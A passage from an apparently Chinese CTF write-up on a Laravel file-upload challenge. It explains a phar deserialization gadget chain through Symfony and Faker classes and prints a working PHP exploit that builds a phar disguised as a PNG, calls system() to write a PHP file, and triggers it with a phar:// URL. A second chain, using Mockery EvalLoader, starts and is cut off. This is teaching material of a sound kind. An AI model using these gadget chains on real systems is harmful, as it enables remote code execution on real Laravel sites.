punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">imageinfo</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'width'</span> <span class="token operator">=></span> <span class="token variable">$width</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'height'</span> <span class="token operator">=></span> <span class="token variable">$height</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'attr'</span> <span class="token operator">=></span> <span class="token variable">$attr</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fun</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"imagecreatefrom"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">image</span> <span class="token operator">=</span> <span class="token variable">$fun</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">src</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">_thumpImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">//...</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>_openImage</code> 方法中，<code>getimagesize</code> 函数会打开一个文件</p><p>而且在 PHP 4.0.5 支持后支持通过 URL 打开</p><p><img src="image-20210430115828.png" alt="image-20210430115828" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430115828.png" class="lozad post-image"></p><p>于是这里我们就可以夹带私货了，比如说 <code>phar://</code></p><h2 id="修洞"><a href="#修洞" class="headerlink" title="修洞"></a>修洞</h2><p>先看路由 <code>routes/web.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">IndexController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fileUpload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file.upload.post'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Don't expose the /image to others!</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">ImageController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'handle'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image.handle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到 <code>//Don&#39;t expose the /image to others!</code></p><p>所以修洞很简单，直接注释掉<code>/image</code>路由即可</p><h2 id="打洞"><a href="#打洞" class="headerlink" title="打洞"></a>打洞</h2><p>题目给了<code>Apache</code>的配置文件，开启了目录重写</p><p>所以访问<code>/index.php/image</code>即可访问到<code>/image</code>路由</p><p>我一开始看这个题目配了 HTTPS，想起来 4qE 比赛之前给我发的那篇推文，以为要打一个走私。结果是这样就绕过了。</p><p>然后这一题可以上传文件，可以读取文件，打一个 <strong>phar 反序列化</strong></p><p>参考文章：<a href="https://xz.aliyun.com/t/9318">一道CTF题引起的对laravel v8.32.1序列化利用链挖掘</a></p><p>题目环境里给出了 Laravel 的版本</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">"^7.3|^8.0"</span><span class="token punctuation">,</span>        <span class="token property">"fideloper/proxy"</span><span class="token operator">:</span> <span class="token string">"^4.4"</span><span class="token punctuation">,</span>        <span class="token property">"fruitcake/laravel-cors"</span><span class="token operator">:</span> <span class="token string">"^2.0"</span><span class="token punctuation">,</span>        <span class="token property">"guzzlehttp/guzzle"</span><span class="token operator">:</span> <span class="token string">"^7.0.1"</span><span class="token punctuation">,</span>        <span class="token property">"laravel/framework"</span><span class="token operator">:</span> <span class="token string">"^8.12"</span><span class="token punctuation">,</span>        <span class="token property">"laravel/tinker"</span><span class="token operator">:</span> <span class="token string">"^2.5"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以照文章找一条链下来是个不错的选择</p><h3 id="ImportConfigurator-类"><a href="#ImportConfigurator-类" class="headerlink" title="ImportConfigurator 类"></a>ImportConfigurator 类</h3><p>第一个是 <code>Symfony\Component\Routing\Loader\Configurator</code> 中的类 <code>ImportConfigurator</code></p><p>该类存在一个包含了语句 <code>$this-&gt;xxx-&gt;xxx()</code> 的 <code>__destruct</code> 方法</p><p>这样我们可以控制 <code>$this-&gt;xxx</code>，从而执行一些预期之外的方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># vendor/symfony/routing/Loader/Configurator/ImportConfigurator.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ImportConfigurator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>    <span class="token comment">//...</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">-></span><span class="token function">addCollection</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">route</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为函数名不可控，找一个有 <code>__call</code> 方法的类</p><p>比如说 <code>Faker</code> 中的类 <code>ValidGenerator</code></p><h3 id="ValidGenerator-类"><a href="#ValidGenerator-类" class="headerlink" title="ValidGenerator 类"></a>ValidGenerator 类</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># vendor/fakephp/faker/src/Faker/ValidGenerator.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ValidGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$generator</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$validator</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$maxRetries</span><span class="token punctuation">;</span>    <span class="token comment">//...</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">generator</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>OverflowException</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Maximum retries of %d reached without finding a valid value'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">validator</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选用这个类是因为这个 <code>__call</code> 方法中包含了清晰可见的 <code>call_user_func_array</code> 和 <code>call_user_func</code></p><p>可以发现 <code>call_user_func</code> 的参数 <code>$this-&gt;validator</code> 是可控的</p><p>而另一个参数 <code>$res</code> 是从 <code>call_user_func_array</code> 函数中获得的返回值</p><p><code>call_user_func_array</code> 的参数中，<code>$this-&gt;generator</code> 是可控的</p><p>但我们无法控制他的返回值，即无法控制 <code>$res</code></p><p>另一个参数 <code>$name</code> 是不可控的，且值为 <code>addCollection</code></p><p>另外我们为了触发一次 <code>call_user_func</code>，这里选择将 <code>$this-&gt;MaxRetries</code> 置为 1 即可</p><p><img src="image-20210430163442769.png" alt="image-20210430163442769" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430163442769.png" class="lozad post-image"></p><h3 id="DefaultGenerator-类"><a href="#DefaultGenerator-类" class="headerlink" title="DefaultGenerator 类"></a>DefaultGenerator 类</h3><p>我们再看到 <code>Faker</code> 中的类 <code>DefaultGenerator</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># vendor/fakephp/faker/src/Faker/DefaultGenerator.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span><span class="token comment">//...</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的 <code>__call</code> 方法会返回一个我们完全可控的 <code>$this-&gt;default</code></p><p>于是到这里，<code>ValidGenerator</code> 中的 <code>$res</code> 参数就是我们可以控制的了</p><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>梳理一下调用链</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ImportConfigurator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">-></span><span class="token function">addCollection</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">route</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ValidGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">generator</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>OverflowException</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Maximum retries of %d reached without finding a valid value'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">validator</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1、通过 <code>ImportConfigurator</code> 类的 <code>__destruct</code> 方法触发 <code>ValidGenerator</code> 类的 <code>__call</code> 方法</p><p>2、<code>ValidGenerator</code> 类的 <code>__call</code> 方法中的 <code>call_user_func_array</code> 函数</p><p>3、触发 <code>DefaultGenerator</code> 类的 <code>__call</code> 方法</p><p>4、<code>DefaultGenerator</code> 类的 <code>__call</code> 方法返回值完全可控</p><p>5、<code>ValidGenerator</code> 类的 <code>__call</code> 方法中的 <code>call_user_func_array</code> 函数返回值 <code>$res</code> 可控</p><p>6、<code>ValidGenerator</code> 类的 <code>__call</code> 方法中 <code>call_user_func</code> 函数的两个参数都可控</p><p>条件梳理</p><ul><li><code>ImportConfigurator-&gt;parent</code> = <code>ValidGenerator 类</code></li><li><code>ValidGenerator-&gt;maxRetries</code> = <code>1</code></li><li><code>ValidGenerator-&gt;generator</code> = <code>DefaultGenerator 类</code></li><li><code>DefaultGenerator-&gt;default</code> = <code>[任意可控函数参数]</code></li><li><code>ValidGenerator-&gt;validator</code> = <code>[任意可控函数名称]</code></li></ul><h3 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar 反序列化"></a>phar 反序列化</h3><p>phar 反序列化是 BlackHat 2018 公布的一种不需要 <code>unserialize</code> 函数就能触发反序列化的方法</p><p>因为百度出来的复制来复制去都是那几篇文章，这里附一份 <a href="https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf">BlackHat 2018 的讲义</a></p><p>PHAR 文件是 PHP Archieve 的缩写，也就是类似于 Java 的 JAR 包的一种压缩文件</p><p><img src="image-20210430120902.png" alt="image-20210430120902" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430120902.png" class="lozad post-image"></p><p>PHP 在读取 PHAR 文件的时候会对 <code>.phar/.metadata.bin</code> 中的内容进行反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># exp1.phar.tar.gz/.phar/.metadata.binO:64:"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator":1:&#123;s:72:" Symfony\Component\Routing\Loader\Configurator\ImportConfigurator parent";O:20:"Faker\ValidGenerator":3:&#123;s:12:" * generator";O:22:"Faker\DefaultGenerator":1:&#123;s:10:" * default";s:34:"echo "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>" > 1.php";&#125;s:12:" * validator";s:6:"system";s:13:" * maxRetries";i:1;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>而 <code>.phar/stub.php</code> 是 PHAR 文件的一个标志，即 <code>__HALT_COMPILER(); ?&gt;</code></p><p><img src="image-20210430121227.png" alt="image-20210430121227" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430121227.png" class="lozad post-image"></p><p>PHP 不会理会这个标志前面是什么东西，他只管把这个标志后面的部分作为 PHAR 包来解析</p><p><code>test.txt</code> 是随便一个什么东西，是一个为了完成压缩而随意构造的东西，PHAR 反序列化的重点也不在这里 2333</p><p>因此只要 PHP 能以 <code>phar://</code> 协议读取这个文件，我们的目的就达到了</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Routing<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>Configurator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">ImportConfigurator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$c1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span> <span class="token operator">=</span> <span class="token variable">$c1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">ValidGenerator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$generator</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$validator</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$maxRetries</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">generator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">validator</span> <span class="token operator">=</span> <span class="token variable">$func</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exp1.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">convertToExecutable</span><span class="token punctuation">(</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">TAR</span><span class="token punctuation">,</span> <span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">GZ</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Routing<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>Configurator<span class="token punctuation">\</span>ImportConfigurator</span><span class="token punctuation">(</span>        <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Faker<span class="token punctuation">\</span>ValidGenerator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'echo "&lt;?php phpinfo(); ?>" > 1.php'</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为上传文件有对 stub 和 php 的过滤，加一行语句压缩一下就能过</p><p>压缩后的文件内容</p><p><img src="image-20210430121617.png" alt="image-20210430121617" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430121617.png" class="lozad post-image"></p><p>足够抽象了吧 233</p><p>生成出来的 <code>exp1.phar.tar.gz</code>，改名为 <code>exp1.png</code></p><p><strong>P.S. 因为 PHP 8 在遇到异常的时候会作为错误处理，停止执行代码</strong></p><p><strong>所以如果题目环境是 PHP 8 好像是打不通的 (我是 Manjaro 神教，被坑了不短时间 2333)</strong></p><p><img src="image-20210429190751.png" alt="image-20210429190751" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190751.png" class="lozad post-image"></p><p>上传文件，然后访问路由 <code>/index.php/image?image=phar://./uploads/xxxxxxx.png</code></p><p><img src="image-20210429190759.png" alt="image-20210429190759" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190759.png" class="lozad post-image"></p><p><img src="image-20210429190813.png" alt="image-20210429190813" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190813.png" class="lozad post-image"></p><p>会返回 500 错误，我开了 Laravel DEBUG 所以页面上有详细信息</p><p>但是 phar 反序列化已经执行了，所以会在 <code>public</code> 目录生成一个 <code>1.php</code></p><p><img src="image-20210429190820.png" alt="image-20210429190820" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190820.png" class="lozad post-image"></p><p>访问 <code>/1.php</code> 即可</p><h3 id="官方版本-EXP"><a href="#官方版本-EXP" class="headerlink" title="官方版本 EXP"></a>官方版本 EXP</h3><p>参考了 ZeddYu 师傅的推文。</p><p>本地环境和 Buu 远程环境不太一样，我的 EXP 好像没打通，官方解用了另一条链。</p><p>有兴趣的师傅可以跟一下这条链。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Dispatcher</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Mockery<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>EvalLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'load'</span><span class="token punctuation">]</span><span class="token 